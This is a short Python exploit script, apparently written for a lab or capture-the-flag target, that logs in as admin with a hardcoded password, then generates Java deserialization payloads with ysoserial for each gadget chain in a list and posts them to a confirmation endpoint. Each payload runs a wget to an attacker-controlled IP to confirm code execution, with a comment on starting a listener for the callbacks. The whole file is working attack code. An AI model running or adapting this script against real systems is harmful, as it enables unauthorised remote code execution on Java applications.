from subprocess import run, PIPE #run shell commands inside application-run, pipe- output to application
import requests

def get_token():
    #!get token function is responsible for log in as admin  end get token JWT
    res = requests.request(url = "http://target.lab:5000/login", method = "POST", json={"username": "admin", "password":"pantera"}) # logon url 
    return res.json()["access_token"]  #get access token in string 


def send_payload(payload, token):
    #!to send our payload with token JWT

    res = requests.request(
            url="http://target.lab:5000/support/confirm",
            method="POST",
            json={"confirmation": payload},
            headers={
                "Authorization": f"Bearer {token}"
            })
    print(res)

token = get_token()

payloads_file =open("./payloadsysoserial.txt")
payloads = payloads_file.readlines()

for payload_name in payloads:
    payload_name= payload_name.strip()
#by default treated all command like 1 argument, need to add shell=True to work well, stdout save result in parm-stdout, stdrr=pipe we won't get the error
    command = f'java -jar /home/kali/ysoserial-all.jar {payload_name} "wget http://10.255.255.100:8080/{payload_name}" | base64 | tr -d "\\n"'   
    #escape \n -python interpretes as new line, put our IP
    result = run(command, shell=True, stdout=PIPE, stderr=PIPE) 
   
    payload = result.stdout.decode("UTF-8") 
    send_payload(payload, token)
    #!then open in shell python3 -m http.server 8080 and run the aplication
    
